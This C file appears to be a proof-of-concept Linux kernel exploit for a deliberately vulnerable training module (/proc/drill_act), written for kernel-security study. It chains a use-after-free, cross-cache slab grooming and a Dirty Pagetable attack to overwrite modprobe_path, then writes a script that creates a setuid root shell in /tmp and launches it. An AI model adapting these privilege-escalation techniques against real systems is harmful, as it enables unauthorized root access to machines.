/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Currently, this PoC performs Dirty Pagetable attack for LPE.
 * This PoC does not work with KASLR and needs modprobe addr pre-written.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sched.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "drill.h"

/*==== Pagetables stuff =====*/
#define MODPROBE_ADDR 0x2b44c60 // Can be obtained via gdb, othervise need to coorrupt many PTE or even use huge pagetables
#define MODPROBE_ADDR_ALIGNED 0x2b44000 // Aligned by page
#define ENTRIES_AMOUNT 512
#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }
/*==== Pagetables stuff =====*/

void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/tmp/root_shell", /* corrupted shell, created by exploit */
		"-p",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/tmp/root_shell", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

static void flush_tlb(void *addr, size_t len) // Exploit can work without it, but will be less reliable
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;

		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;
	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);
	fexecve(fd, &argv_envp, &argv_envp);
	close(fd);
}

void gen_privesc_script()
{
	FILE *fp = fopen("/tmp/exploit", "w");
	if (!fp) {
		perror("file open");
		exit(EXIT_FAILURE);
	}
	fprintf(fp, "#!/bin/sh\n");
	fprintf(fp, "cp /bin/sh /tmp/root_shell\n");
	fprintf(fp, "chmod +s /tmp/root_shell\n");
	fclose(fp);
	chmod("/tmp/exploit", 0755);
}

int prepare_tables()
{
	/* prepare infra */
	void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		exit(EXIT_FAILURE);
	}
	/* Pre-register new tables and entries */
	for (unsigned long long i = 0; i < 512; i++) {
		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		exit(EXIT_FAILURE);
	}
	printf("[+] done, PTE is ready for allocation\n");
	return 0;
}

long UAF_write(long phys_addr, long uaf_n, long fd)
{
	char addr_offset[16];
	long flags;
	flags = 0x67;  /* RW access for normal users and some sanity flags */
	snprintf(addr_offset, sizeof(addr_offset), "0x%08lx" " %d", phys_addr + flags, 0);
	act(fd, DRILL_ACT_SAVE_VAL, uaf_n, addr_offset);
	return 0;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare pagetables infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create pagetable to allocate freed memory
 *  - perform uaf write using the dangling reference
 *  - create an exploit file and write its path as new modprobe path via the overwritten target object
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	void *modprobe_addr;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	printf("[!] prepare pagetables infrastructure\n");
	prepare_tables();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for pagetable\n");

	printf("[!] create pagetable to allocate freed memory\n");
	for (unsigned long long i=0; i < ENTRIES_AMOUNT; i++) {
		*(unsigned int*)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
	}
	printf("[+] done, vulnerable pagetable has been created\n");

	long phys_addr = MODPROBE_ADDR_ALIGNED;
	printf("[!] perform uaf write using the dangling reference\n");
	printf("[+] Attempting to overwrite pagetable entries. This may kill your kernel.\n");
	UAF_write(phys_addr, uaf_n, fd);
	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000);
	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
		unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0);
		unsigned int value = *ptr;
		if (value != 0xcafecafe) {
			modprobe_addr = (char *)ptr + MODPROBE_ADDR - MODPROBE_ADDR_ALIGNED;
			if (modprobe_addr != NULL) {
				printf("[+] success, userspace modprobe address %p\n", modprobe_addr);
				printf("[!] create an exploit file and write its path as new modprobe path via the overwritten target object\n");
				gen_privesc_script();
				strcpy(modprobe_addr, "/tmp/exploit");
				printf("[+] done, triggering a corrupted modprobe to create a root shell with suid\n");
				modprobe_trigger_memfd();
				printf("[+] launching root shell\n");
				run_sh();
			}
		}
	}

end:
	printf("[!] finishing this PoC exploit\n");

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
		printf("  closed the drill_act fd\n");
	}

	return ret;
}
